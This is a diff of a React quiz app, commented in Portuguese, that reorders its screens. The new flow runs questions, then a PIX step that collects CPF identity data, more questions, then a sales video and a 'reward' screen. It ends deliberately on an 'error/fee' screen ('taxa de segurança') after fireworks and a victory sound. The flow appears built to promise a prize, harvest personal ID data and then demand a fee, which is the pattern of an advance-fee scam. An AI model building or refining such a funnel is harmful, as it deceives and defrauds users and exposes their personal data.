@@ -110,10 +110,11 @@ function App() {
   const [userName, setUserName] = useState('Usuário');
   const [showFailureScreen, setShowFailureScreen] = useState(false);
   const [showVideoScreen, setShowVideoScreen] = useState(false);
-  const [isPostVideo, setIsPostVideo] = useState(false);
   const [showRewardScreen, setShowRewardScreen] = useState(false);
   const [showCpfRewardScreen, setShowCpfRewardScreen] = useState(false);
   const [cpfRewardData, setCpfRewardData] = useState<any>(null);
+  const [hasCompletedPix, setHasCompletedPix] = useState(false);
+  const [hasCompletedVideo, setHasCompletedVideo] = useState(false);
 
   useEffect(() => {
     if (isCompleted) {
@@ -231,42 +232,62 @@ function App() {
     setIsTransitioning(false);
     setIsAnimatingCoins(false);
 
-    if (currentQuestion < 5) {
-      setCurrentQuestion(prev => prev + 1);
-    } else if (!isPostVideo) {
+    // Novo fluxo: 6 perguntas → PIX → 4 perguntas → VSL → recompensa → erro
+    if (currentQuestion === 5 && !hasCompletedPix) {
+      // Após a 6ª pergunta (índice 5), vai para PIX
+      setShowPixScreen(true);
+    } else if (currentQuestion === 9 && hasCompletedPix && !hasCompletedVideo) {
+      // Após a 10ª pergunta (índice 9), vai para VSL
       setShowVideoScreen(true);
-      setIsPostVideo(true);
-      setCurrentQuestion(6);
     } else if (currentQuestion < questions.length - 1) {
+      // Continua com as perguntas
       setCurrentQuestion(prev => prev + 1);
     } else {
+      // Fim de todas as perguntas - vai para tela de erro/taxa
       setShowFireworks(true);
       setIsCompleted(true);
-      setShowPixScreen(true); // Vai direto para a tela PIX
+      setShowFailureScreen(true);
       playVictorySequence();
     }
   };
 
   const handleVideoComplete = () => {
     setShowVideoScreen(false);
+    setHasCompletedVideo(true);
+    
+    // Após o vídeo, mostra a tela de recompensa se tem dados do CPF
+    if (cpfRewardData) {
+      setShowCpfRewardScreen(true);
+    } else {
+      // Se não tem dados do CPF, vai direto para erro
+      setShowFireworks(true);
+      setIsCompleted(true);
+      setShowFailureScreen(true);
+      playVictorySequence();
+    }
   };
 
   const handlePixSubmit = (cpfData?: any) => {
     setShowPixScreen(false);
+    setHasCompletedPix(true);
     
     if (cpfData) {
-      // Se tem dados do CPF, mostra a tela dinâmica
+      // Salva os dados do CPF mas NÃO mostra a tela ainda
       setCpfRewardData(cpfData);
-      setShowCpfRewardScreen(true);
-    } else {
-      // Se não tem dados do CPF, vai direto para a taxa de segurança
-      setShowFailureScreen(true);
     }
+    
+    // Continua com as perguntas (pergunta 7)
+    setCurrentQuestion(6);
   };
 
   const handleCpfRewardContinue = () => {
     setShowCpfRewardScreen(false);
+    
+    // Após mostrar a recompensa do CPF, vai para tela de erro
+    setShowFireworks(true);
+    setIsCompleted(true);
     setShowFailureScreen(true);
+    playVictorySequence();
   };
 
   if (showWelcome) {
